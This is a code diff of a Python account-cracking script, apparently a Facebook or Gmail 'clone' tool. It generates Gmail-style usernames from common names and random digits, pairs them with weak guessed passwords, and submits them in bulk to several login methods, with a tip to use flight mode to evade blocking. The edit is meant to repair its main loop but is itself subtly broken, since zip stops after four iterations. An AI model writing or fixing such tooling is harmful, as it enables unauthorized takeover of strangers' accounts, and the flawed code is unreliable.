@@ -935,6 +935,8 @@ def g_clone():
     os.system('clear')
     print(logo)
     print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+    first = ['sumon','abinash','rakesh','riya','ramesh','somnath']
+    last = ['roy','das','sarkar','mondal']
     domain = '@gmail.com'
     try:
         limit = int(input(' [:] Crack Limit : '))
@@ -942,10 +944,7 @@ def g_clone():
         limit = 5000
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(3))
-        last = random.choice(['roy','das','sarkar','mondal'])
         user.append(nmp)
-        first = random.choice(['sumon','abinash','rakesh','riya','ramesh','somnath'])
-        nam.append(first)
     clear()
     print("                CHOOSE METHOD                       ")
     print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
@@ -973,9 +972,9 @@ def g_clone():
         print(f'{green}=> TOTAL LIMID : \033[1;32m'+tl)
         print(f'{green}=> USE FLIGHT MODE ')
         print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-        for love in user and for nam in  frst:
-            uid = frst+last+love+domain
-            pwx = [frst+last,frst+'12',frst+'123',frst+'1234',frst+'12345']
+        for love, firs, las in zip(user, first, last):
+            uid = firs+las+love+domain
+            pwx = [firs+las,firs+'12',firs+'123',firs+'1234',firs+'12345']
             if SUMONfire =='1':SUMON_xd.submit(mbasic,uid,pwx,tl)
             elif SUMONfire =='2':SUMON_xd.submit(p,uid,pwx,tl)
             elif SUMONfire =='3':SUMON_xd.submit(x,uid,pwx,tl)
